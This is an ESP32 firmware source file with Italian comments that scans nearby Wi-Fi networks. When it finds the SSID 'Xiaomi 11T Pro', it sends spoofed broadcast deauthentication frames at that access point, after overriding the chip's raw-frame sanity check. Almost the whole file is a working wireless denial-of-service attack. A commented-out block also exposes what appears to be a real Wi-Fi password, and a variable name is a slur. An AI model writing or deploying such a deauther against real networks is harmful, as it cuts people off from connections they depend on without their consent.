extern "C" {
#include "freertos/FreeRTOS.h"

#include "esp_system.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_netif.h"

#include "nvs_flash.h"
#include <time.h>
#include "configure_wifi.h"
}
#include "esp_log.h"
#include "packet.hpp"
#include <cstring>

PacketSender sender;
#define TASK_NAME "spam_task"

wifi_ap_record_t *apRecords;
void deauth_task(MacAddr bssid, uint8_t prim_chan);

    // PARAMETRO .authmode
static void print_auth_mode(int authmode)
{
    switch (authmode) {
    case WIFI_AUTH_OPEN:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_OPEN");
        break;
    case WIFI_AUTH_OWE:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_OWE");
        break;
    case WIFI_AUTH_WEP:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WEP");
        break;
    case WIFI_AUTH_WPA_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA_PSK");
        break;
    case WIFI_AUTH_WPA2_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA2_PSK");
        break;
    case WIFI_AUTH_WPA_WPA2_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA_WPA2_PSK");
        break;
    case WIFI_AUTH_ENTERPRISE:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_ENTERPRISE");
        break;
    case WIFI_AUTH_WPA3_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA3_PSK");
        break;
    case WIFI_AUTH_WPA2_WPA3_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA2_WPA3_PSK");
        break;
    case WIFI_AUTH_WPA3_ENT_192:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA3_ENT_192");
        break;
    case WIFI_AUTH_WPA3_EXT_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA3_EXT_PSK");
        break;
    default:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_UNKNOWN");
        break;
    }
}
// stessi parametri del nome
static void print_cipher_type(int pairwise_cipher, int group_cipher)
{
    switch (pairwise_cipher) {
    case WIFI_CIPHER_TYPE_NONE:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_NONE");
        break;
    case WIFI_CIPHER_TYPE_WEP40:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_WEP40");
        break;
    case WIFI_CIPHER_TYPE_WEP104:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_WEP104");
        break;
    case WIFI_CIPHER_TYPE_TKIP:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_TKIP");
        break;
    case WIFI_CIPHER_TYPE_CCMP:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_CCMP");
        break;
    case WIFI_CIPHER_TYPE_TKIP_CCMP:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_TKIP_CCMP");
        break;
    case WIFI_CIPHER_TYPE_AES_CMAC128:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_AES_CMAC128");
        break;
    case WIFI_CIPHER_TYPE_SMS4:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_SMS4");
        break;
    case WIFI_CIPHER_TYPE_GCMP:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_GCMP");
        break;
    case WIFI_CIPHER_TYPE_GCMP256:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_GCMP256");
        break;
    default:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_UNKNOWN");
        break;
    }

    switch (group_cipher) {
    case WIFI_CIPHER_TYPE_NONE:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_NONE");
        break;
    case WIFI_CIPHER_TYPE_WEP40:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_WEP40");
        break;
    case WIFI_CIPHER_TYPE_WEP104:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_WEP104");
        break;
    case WIFI_CIPHER_TYPE_TKIP:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_TKIP");
        break;
    case WIFI_CIPHER_TYPE_CCMP:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_CCMP");
        break;
    case WIFI_CIPHER_TYPE_TKIP_CCMP:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_TKIP_CCMP");
        break;
    case WIFI_CIPHER_TYPE_SMS4:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_SMS4");
        break;
    case WIFI_CIPHER_TYPE_GCMP:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_GCMP");
        break;
    case WIFI_CIPHER_TYPE_GCMP256:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_GCMP256");
        break;
    default:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_UNKNOWN");
        break;
    }
}


//esp_err_t esp_wifi_set_mac(wifi_interface_t ifx, const uint8_t mac[6])
void spoofMAC(MacAddr* pMAC ){
    //apple 98:ca:33
    unsigned char gay[3];
    for(int i = 0; i <3 ;i++){
        gay[i]= (unsigned char) rand() % 256; 
    }


    for(int i =0 ; i<3 ;i++){
        (*pMAC)[3+i] = gay[i];
    }
        

}
//esp_err_t esp_wifi_scan_start(const wifi_scan_config_t *config, bool block)
//esp_err_t esp_wifi_scan_stop(void)
//esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records)
void scanWifi(void *pvParameter){
    ESP_LOGI(TASK_NAME, "entrato nella funzione SCANWIFI");
    while(1){
        vTaskDelay(1000 / portTICK_PERIOD_MS);
        //ESP_LOGI(TASK_NAME, "prima di scan_start");

        esp_wifi_scan_start(NULL,true);
        //ESP_LOGI(TASK_NAME, "dopo scan_start");

        esp_wifi_scan_stop();
        //ESP_LOGI(TASK_NAME, "dopo scan_stop");

        uint16_t maxAP = 15; //arbitrary number max APs stored
        esp_wifi_scan_get_ap_num(&maxAP);
        uint16_t AP_num = maxAP;
        apRecords = new wifi_ap_record_t[maxAP];
        //ESP_LOGI(TASK_NAME, "prima di get_ap_record");
        //ESP_LOGI(TASK_NAME, "maxAP: %d", maxAP);
        esp_wifi_scan_get_ap_records(&maxAP , apRecords);
        //ESP_LOGI(TASK_NAME, "dopo get_ap_records");

        //ESP_LOGI(TASK_NAME, "maxAP: %d", maxAP);
        
        for(int i=0;i < AP_num;i++){
            ESP_LOGI(TASK_NAME, "SSID: %s", apRecords[i].ssid);

            ESP_LOGI(TASK_NAME, "BSSID: %x:%x:%x:%x:%x:%x", apRecords[i].bssid[0],apRecords[i].bssid[1],apRecords[i].bssid[2],apRecords[i].bssid[3],apRecords[i].bssid[4],apRecords[i].bssid[5]);
            print_auth_mode(apRecords[i].authmode);
            ESP_LOGI(TASK_NAME, "RSSI: %d", apRecords[i].rssi);
            ESP_LOGI(TASK_NAME, "########################################\n");
            if(!strcmp("Xiaomi 11T Pro", (char *)apRecords[i].ssid)){
                ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK\n");
                deauth_task(apRecords[i].bssid,apRecords[i].primary);
            }
        }
        

    }
}


extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0; //LA FUNZIONE IMPEDISCE DI MANDARE PACCHETTI "STRANI"
}


void deauth_task(MacAddr bssid, uint8_t prim_chan) {

    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
 

        //.ap = {
          //  .ssid = "Xiaomi 11T Pro",
           // .ssid_len = 14,
           // .password = "C@garella18",
           // .channel = prim_chan,
           // .authmode = WIFI_AUTH_WPA2_PSK,
           /// .ssid_hidden = 0,
           // .max_connection = 4,
           // .beacon_interval = 60000

    const MacAddr TARGET = { //target broadcast
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    };
    MacAddr AP = {
        //re place with your AP's mac address
        //98:ca:33
        0x98, 0xca, 0x33, 0x32, 0x65, 0xe4
    };
    spoofMAC(&AP);
    ESP_LOGI(TASK_NAME, "dopo spoof MAC");
    //ESP_ERROR_CHECK(esp_wifi_set_mac(,AP));
    //scanWifi();
    

    esp_err_t res;

    res = sender.deauth(TARGET, AP, bssid, 1, prim_chan);
    ESP_LOGI(TASK_NAME, "dopo sender.deauth");

    if(res != ESP_OK) {
        printf("  Error: %s\n", esp_err_to_name(res));
    }
    vTaskDelay(10000 / portTICK_PERIOD_MS);
}



extern "C" void app_main(void) {
    srand(time(NULL));

    nvs_flash_init();
    esp_netif_init();    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK(esp_event_loop_create_default());
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    // Init dummy AP to specify a channel and get WiFi hardware into
    // a mode where we can send the actual fake beacon frames.
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));

    //ESP_ERROR_CHECK(esp32_deauther_configure_wifi(1));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    xTaskCreate(&scanWifi, TASK_NAME, 8192 /*profondità dellostack*/, NULL, 5, NULL);
}

